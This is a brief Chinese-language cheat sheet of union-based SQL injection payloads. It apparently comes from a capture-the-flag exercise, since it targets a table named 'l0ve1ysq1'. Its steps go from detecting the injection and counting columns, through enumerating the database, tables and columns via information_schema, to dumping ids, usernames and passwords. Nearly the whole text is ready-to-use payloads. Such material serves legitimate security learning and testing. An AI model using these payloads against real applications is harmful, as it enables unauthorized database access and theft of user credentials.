# SQL注入

1.判断是否存在注入，注入是字符型还是数字型
1'
1' or 1=1 #
2.猜解SQL查询语句中的字段数
1' order by 3#
3.确定回显的字段数并确定注入点
1' union select 1,2,3#
4.获取当前数据库和版本
1' union select 1,database(),version()#
5.获取表名
1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#
5.获取表中字段名
1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'
6.下载数据 
1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1